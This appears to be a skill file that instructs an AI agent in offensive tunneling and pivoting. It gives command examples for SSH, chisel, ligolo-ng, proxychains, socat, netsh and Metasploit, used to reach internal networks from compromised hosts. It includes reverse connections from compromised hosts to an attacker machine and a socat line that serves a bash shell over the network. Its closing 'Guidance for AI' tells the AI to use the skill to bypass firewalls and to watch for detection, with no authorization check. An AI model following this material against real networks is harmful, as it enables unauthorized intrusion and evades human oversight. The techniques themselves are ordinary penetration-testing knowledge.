# Tunneling and Port Forwarding Skill

## Goal

Create tunnels and port forwards to bypass network restrictions, pivot through compromised hosts, and access internal services.

## Methodology

1. **Assess Network Position**: Understand current access and target networks
2. **Choose Technique**: Select appropriate tunneling method
3. **Establish Tunnel**: Create port forwards or SOCKS proxies
4. **Route Traffic**: Configure tools to use the tunnel
5. **Pivot Further**: Chain tunnels for deep network access

## Tools

* **SSH**: Native tunneling capabilities
* **chisel**: HTTP-based tunneling
* **ligolo-ng**: Advanced pivoting framework
* **proxychains**: SOCKS proxy chaining
* **socat**: Socket relay
* **netsh**: Windows port forwarding
* **plink**: Windows SSH client

## SSH Local Port Forwarding

```bash
# Forward local port to remote service
# Access remote_host:remote_port via localhost:local_port
ssh -L local_port:remote_host:remote_port user@jump_host

# Examples:
# Access internal web server
ssh -L 8080:internal.server:80 user@gateway

# Access internal database
ssh -L 3306:db.internal:3306 user@gateway

# Then connect locally:
curl http://localhost:8080
mysql -h 127.0.0.1 -P 3306

# Multiple forwards
ssh -L 8080:web:80 -L 3306:db:3306 user@gateway
```

## SSH Remote Port Forwarding

```bash
# Expose local service to remote network
ssh -R remote_port:local_host:local_port user@remote_host

# Expose attacker service to internal network
ssh -R 4444:localhost:4444 user@compromised_host

# Expose internal service to attacker
ssh -R 8080:localhost:80 user@attacker

# Now internal web server is accessible at attacker:8080
```

## SSH Dynamic Port Forwarding (SOCKS Proxy)

```bash
# Create SOCKS proxy through SSH
ssh -D 1080 user@gateway

# Use with proxychains
# Edit /etc/proxychains.conf:
# socks4 127.0.0.1 1080

proxychains nmap -sT -Pn 10.10.10.0/24
proxychains curl http://internal.server

# Or configure browser to use SOCKS proxy
# Firefox: Preferences -> Network -> Manual Proxy -> SOCKS Host: 127.0.0.1:1080
```

## Chisel Tunneling

```bash
# Start chisel server on attacker
chisel server --port 8000 --reverse

# From compromised host, connect back
./chisel client attacker:8000 R:socks

# Now use SOCKS proxy on attacker:1080
proxychains nmap -sT -Pn internal.target

# Remote port forward
./chisel client attacker:8000 R:8080:internal.server:80

# Local port forward
./chisel client attacker:8000 8080:internal.server:80
```

## Ligolo-ng Pivoting

```bash
# On attacker (server)
sudo ligolo-ng proxy -selfcert

# On compromised host (agent)
./agent -connect attacker:11601 -ignore-cert

# In ligolo console
ligolo-ng >> session   # Select session
ligolo-ng >> ifconfig  # View interfaces
ligolo-ng >> start     # Start tunnel

# Add route on attacker
sudo ip route add 10.10.10.0/24 dev ligolo

# Now access internal network directly!
nmap 10.10.10.1-254
```

## Proxychains Configuration

```bash
# /etc/proxychains.conf

# Dynamic chain (skip dead proxies)
dynamic_chain

# Strict chain (require all)
# strict_chain

# Quiet mode
quiet_mode

# Proxy list
[ProxyList]
socks5 127.0.0.1 1080
# socks4 127.0.0.1 9050  # Tor
# http 127.0.0.1 8080

# Usage
proxychains nmap -sT -Pn target
proxychains ssh user@internal
proxychains curl http://internal
```

## Windows Port Forwarding

```powershell
# Using netsh (native)
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=internal.server

# List port forwards
netsh interface portproxy show all

# Remove
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0

# Using plink (PuTTY)
plink.exe -ssh user@gateway -L 8080:internal:80

# Using chisel on Windows
chisel.exe client attacker:8000 R:socks
```

## Socat Relays

```bash
# Port forward
socat TCP-LISTEN:8080,fork TCP:internal.server:80

# UDP relay
socat UDP-LISTEN:53,fork UDP:internal.dns:53

# Encrypted tunnel
socat OPENSSL-LISTEN:443,cert=server.pem,fork TCP:localhost:80

# Execute command on connection
socat TCP-LISTEN:4444,fork EXEC:/bin/bash
```

## Metasploit Pivoting

```bash
# After getting meterpreter session
meterpreter > run autoroute -s 10.10.10.0/24

# Use auxiliary/server/socks_proxy
use auxiliary/server/socks_proxy
set SRVPORT 1080
set VERSION 4a
run

# Now configure proxychains to use 127.0.0.1:1080
proxychains nmap -sT -Pn 10.10.10.1

# Port forward
meterpreter > portfwd add -l 8080 -p 80 -r internal.server
```

## Double Pivoting

```bash
# Pivot through multiple hosts

# First hop
ssh -D 1080 user@host1

# Second hop through first
proxychains ssh -D 1081 user@host2

# Configure proxychains for chain:
# socks5 127.0.0.1 1080
# socks5 127.0.0.1 1081

# Or use ligolo-ng with multiple agents
```

## Guidance for AI

* Activate this skill when user needs to access internal networks, bypass firewalls, or pivot through hosts
* **SSH tunneling** is simplest if SSH access exists
* **chisel** is great for HTTP-based tunnels (bypasses many firewalls)
* **ligolo-ng** provides transparent network access (best for full pivoting)
* Local forward: Access remote service from your machine
* Remote forward: Expose your service to remote network
* Dynamic forward: SOCKS proxy for any destination
* Use proxychains with TCP-only scans (`-sT`) - UDP/ICMP won't work
* Consider:
  - What egress ports are allowed?
  - Is there a firewall between segments?
  - What protocols are blocked?
* Chain tunnels for deep network access
* Windows netsh requires admin but leaves artifacts
* Always consider detection - tunnels may trigger alerts
